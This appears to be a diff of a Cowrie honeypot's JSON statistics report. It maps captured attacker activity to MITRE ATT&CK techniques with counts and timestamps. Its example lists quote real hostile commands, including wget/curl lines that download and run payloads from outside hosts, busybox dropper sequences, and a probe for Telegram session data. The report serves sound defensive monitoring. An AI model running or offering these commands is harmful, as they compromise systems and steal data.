@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-10-28 21:06:24",
+  "generated": "2026-10-28 22:06:21",
   "totals": {
-    "commands": 491534,
-    "login_failed": 539578,
-    "login_success": 82762,
-    "sessions": 570953
+    "commands": 491708,
+    "login_failed": 539645,
+    "login_success": 82771,
+    "sessions": 571043
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 539578,
+      "count": 539645,
       "examples": [
         "root / 123456",
         "nobody / None",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-08-10T23:55:42.664651Z",
-      "last": "2026-10-28T21:02:53.162407Z",
-      "unique_ips": 8364
+      "last": "2026-10-28T22:02:36.556587Z",
+      "unique_ips": 8366
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 82762,
+      "count": 82771,
       "examples": [
         "root / admin",
         "uname -a / exit",
@@ -37,14 +37,14 @@
         "admin / vertex25ektks123"
       ],
       "first": "2026-08-10T23:55:55.666658Z",
-      "last": "2026-10-28T20:57:11.675171Z",
-      "unique_ips": 6919
+      "last": "2026-10-28T22:02:41.569085Z",
+      "unique_ips": 6921
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 57344,
+      "count": 57380,
       "examples": [
         "/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-11T00:40:37.500509Z",
-      "last": "2026-10-28T20:57:13.073470Z",
+      "last": "2026-10-28T22:02:46.155618Z",
       "unique_ips": 2813
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 32709,
+      "count": 32729,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-28T20:57:25.870193Z",
-      "unique_ips": 1665
+      "last": "2026-10-28T21:39:41.860318Z",
+      "unique_ips": 1666
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 17517,
+      "count": 17541,
       "examples": [
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://77.90.185.66/wget",
@@ -85,8 +85,8 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-11T00:40:37.931453Z",
-      "last": "2026-10-28T20:57:23.322797Z",
-      "unique_ips": 2626
+      "last": "2026-10-28T21:39:42.804036Z",
+      "unique_ips": 2627
     },
     {
       "id": "T1082",
@@ -108,7 +108,7 @@
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 4330,
+      "count": 4350,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
@@ -117,8 +117,8 @@
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
       ],
       "first": "2026-08-11T01:37:17.632875Z",
-      "last": "2026-10-28T20:57:22.434142Z",
-      "unique_ips": 930
+      "last": "2026-10-28T21:39:41.860318Z",
+      "unique_ips": 931
     },
     {
       "id": "T1033",
@@ -404,35 +404,35 @@
   "unmapped": [
     [
       "sh",
-      74730
+      74738
     ],
     [
       "system",
-      74192
+      74200
     ],
     [
       "shell",
-      46821
+      46829
     ],
     [
       "/bin/busybox",
-      14813
+      14819
     ],
     [
       "/bin/busybox HISILICON",
-      12353
+      12362
     ],
     [
       "enable",
-      9708
+      9716
     ],
     [
       "ping; sh",
-      8145
+      8151
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      4063
+      4066
     ],
     [
       "/bin/busybox UNSTABLE",
@@ -440,7 +440,7 @@
     ],
     [
       "sh .k",
-      3240
+      3260
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -448,7 +448,7 @@
     ],
     [
       "linuxshell",
-      1335
+      1337
     ],
     [
       "/bin/busybox echo -ne \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\",
@@ -456,7 +456,7 @@
     ],
     [
       "ping ;sh",
-      1116
+      1118
     ],
     [
       "/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox",
@@ -485,10 +485,10 @@
   ],
   "data_since": "2026-08-10T23:55:42",
   "last_24h": {
-    "logins": 8767,
-    "sessions": 9150,
-    "commands": 16954,
-    "downloads": 528,
-    "unique_ips": 407
+    "commands": 14297,
+    "sessions": 9075,
+    "logins": 8709,
+    "downloads": 470,
+    "unique_ips": 398
   }
 }
